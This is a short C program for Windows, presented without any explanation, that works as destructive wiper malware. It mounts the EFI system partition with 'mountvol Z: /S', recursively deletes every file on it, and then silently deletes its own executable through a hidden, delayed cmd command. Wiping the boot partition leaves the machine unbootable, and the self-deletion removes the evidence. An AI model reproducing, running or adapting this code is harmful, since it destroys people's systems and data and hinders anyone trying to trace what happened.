#include <stdio.h>
#include <windows.h>

void walk(const char *dir) {
    WIN32_FIND_DATA fd;
    char path[MAX_PATH];
    HANDLE h;

    sprintf(path, "%s\\*", dir);

    if ((h = FindFirstFile(path, &fd)) == INVALID_HANDLE_VALUE)
        return;

    do {
        if (!lstrcmp(fd.cFileName, ".") || !lstrcmp(fd.cFileName, ".."))
            continue;

        sprintf(path, "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            walk(path);
        } else {
            DeleteFileA(path);
        }

    } while (FindNextFile(h, &fd));

    FindClose(h);
}

int main() {

    system("mountvol Z: /S");
    walk("Z:");
    system("mountvol Z: /D");

    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char cmd[MAX_PATH + 50];
    sprintf(cmd, "cmd /c timeout /t 2 >nul & del /f /q \"%s\"", path);
    WinExec(cmd, SW_HIDE);

    return 0;
}
